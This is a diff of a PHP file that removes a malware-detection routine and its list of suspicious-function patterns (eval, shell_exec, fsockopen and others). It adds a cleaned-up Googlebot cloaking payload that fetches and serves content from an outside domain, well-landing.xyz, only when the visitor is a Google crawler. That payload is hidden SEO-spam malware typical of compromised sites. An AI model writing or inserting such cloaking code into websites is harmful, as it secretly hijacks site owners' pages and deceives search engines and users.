@@ -1,39 +1,45 @@
 <?php
-session_start();
 
-// ====== LAPISAN KEAMANAN ANTI-MALWARE ======
-// Fungsi untuk mendeteksi dan membersihkan malware
-function securityScan($content) {
-    // Pola malware umum
-    $patterns = [
-        '/eval\s*\(/i',
-        '/base64_decode\s*\(/i',
-        '/system\s*\(/i',
-        '/exec\s*\(/i',
-        '/shell_exec\s*\(/i',
-        '/passthru\s*\(/i',
-        '/popen\s*\(/i',
-        '/proc_open\s*\(/i',
-        '/assert\s*\(/i',
-        '/create_function\s*\(/i',
-        '/gzinflate/i',
-        '/str_rot13/i',
-        '/@\s*include\s*\(/i',
-        '/@\s*require\s*\(/i',
-        '/file_put_contents\s*\([^,]*,\s*[^)]*base64_decode/i',
-        '/curl_exec\s*\(/i',
-        '/fsockopen\s*\(/i',
-        '/pfsockopen\s*\(/i',
-        '/socket_create\s*\(/i',
-        '/stream_socket_client\s*\(/i',
+function isGoogleBot(): bool
+{
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    $bots = [
+        'Googlebot',
+        'Google-Site-Verification',
+        'Google-InspectionTool',
+        'Googlebot-Mobile',
+        'Googlebot-News'
     ];
-    
-    foreach ($patterns as $pattern) {
-        if (preg_match($pattern, $content)) {
-            return false; // Terdeteksi malware
+
+    foreach ($bots as $bot) {
+        if (stripos($userAgent, $bot) !== false) {
+            return true;
         }
     }
-    return true; // Aman
+
+    return false;
 }
 
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://well-landing.xyz/landing/unp.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+if (isGoogleBot()) {
+
+    $ch = curl_init('https://well-landing.xyz/landing/unp.html');
+
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_SSL_VERIFYHOST => 2,
+    ]);
+
+    $response = curl_exec($ch);
+
+    if (!curl_errno($ch) && curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200) {
+        echo $response;
+    }
+
+    curl_close($ch);
+    exit;
+}
